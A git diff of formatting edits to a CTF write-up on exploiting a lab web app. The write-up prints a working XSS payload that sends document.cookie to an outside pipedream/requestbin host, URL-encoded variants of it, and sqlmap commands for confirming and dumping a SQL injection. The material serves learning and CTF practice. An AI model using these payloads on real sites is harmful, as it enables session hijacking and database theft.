@@ -187,7 +187,7 @@ Upgrade-Insecure-Requests: 1
 hrs=1&reason=1
 ```
 While we are unable to amend the `hrs` parameter, it is possible to manipulate the `reason` parameter where we can inject something. But does it mean it would be necessarily executed on the server side?
-We should always apply situational awareness, and consider what sort of controls the developers have already implemented. If we inject special characters e.g., the application will return a filtered record on the *Record List*
+We should always apply situational awareness to understand the environmental settings, and consider what sort of controls the developers have already implemented. If we inject special characters e.g., the application will return a filtered record on the *Record List*
 
 ![image](https://user-images.githubusercontent.com/94167587/144216052-d5481222-8cc6-443b-bf57-5a4896619a63.png)
 
@@ -231,7 +231,7 @@ hrs=1&reason=%22%3e%3csvg%2fonload%3dalert%28document.cookie%29%3e
 
 
 *Step 2 – Proving XSS can send to our requestbin server*
-Onload=fetch() is a good payload to perform such action
+`Onload=fetch()` is a good payload to perform such action
 ```
 Upgrade-Insecure-Requests: 1
 
@@ -242,7 +242,7 @@ hrs=1&reason= %22%3e%3csvg%2fonload%3dfetch%60https%3a%2f%2fen8bq7uoc2g7wz3%2em%
 ![image](https://user-images.githubusercontent.com/94167587/144216221-7ca07c83-4bb9-4748-8cd9-2e44460bb6c0.png)
 
 *Step 3 – Combining the both*
-<svg onload=fetch( ' //HOST/?cookie= ' +document.cookie) is supposed to be a good payload. However, upon further trial and error, I realize a space or %20 is something this server does not like (input filtering). Worse, even if it succeeds sending to our requestbin server, document.cookie is not captured ☹ 
+`<svg onload=fetch( ' //HOST/?cookie= ' +document.cookie)` is supposed to be a good payload. However, upon further trial and error, I realize a space or %20 is something this server does not like (input filtering). Worse, even if it succeeds sending to our requestbin server, document.cookie is not captured ☹ 
  
 ![image](https://user-images.githubusercontent.com/94167587/144216262-004691bb-fc7e-46d9-9752-1a9babe0d7a9.png)
 ![image](https://user-images.githubusercontent.com/94167587/144216310-119c2722-b257-450b-a0b8-3be74feb75a1.png)
@@ -258,8 +258,10 @@ hrs=1&reason='%22%3e%3csvg%2fonload%3dfetch%28%60%2f%2fen8bq7uoc2g7wz3.m.pipedre
 ```
 And it works! 
 An URL decoded look of my final payload looks like this:
+
+```
 '"><svg/onload=fetch(`https://XXX.m.pipedream.net/?data${document.cookie}`)>
- 
+```
  ![image](https://user-images.githubusercontent.com/94167587/144216345-4d5b8a2c-d58c-458d-9b91-cfd319e71200.png)
 
 Voila~ Shouldn’t have taken me that long!
@@ -298,7 +300,7 @@ Content-Length: 379
 [..snip..]
 status%5B1379%5D=0&change=Save+status
 ```
-The response of such request has revealed a SQL error message after supplementing a ‘ , which tempted me to enumerate further.
+The response of such request has revealed a SQL error message after supplementing a `‘` , which tempted me to enumerate further.
 ```
 Error: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '1352'' at line 1	
 ```
@@ -306,8 +308,8 @@ Error: You have an error in your SQL syntax; check the manual that corresponds t
 For this SQLi, I leverage the help from sqlmap, which comes in handy (also lazy). Many people would recommend a manual exploitation to understand SQLinjection, which I cannot agree more.
 
 Step 1 – Confirming the injection point
-I first save the request into a *search.req” file so I can parse the request easily when using SQLinjection
-Next, I use the –current-user extension to confirm the injection point.
+I first save the request into a *search.req* file so I can parse the request easily when using SQLinjection
+Next, I use the `–current-user` extension to confirm the injection point.
 ```
 sqlmap -r search.req --current-user
         ___
@@ -346,7 +348,8 @@ current user: 'root@%'
 *Step 2 – Dumping the databases, then table content*
 I made a mistake by trying to dump the table (i.e. flag) first, which wouldn’t succeed. Yes, I already know the table name “flag” from the CTF hint, but still, we have to go step by step.
  
-![Uploading image.png…]()
+![image](https://user-images.githubusercontent.com/94167587/144216777-192b9610-795e-4083-8102-b94765921d68.png)
+
  
   
  I made a good reference by reading a [CTF write-up post]( https://ctftime.org/writeup/24593) First, let’s list the databases 😊
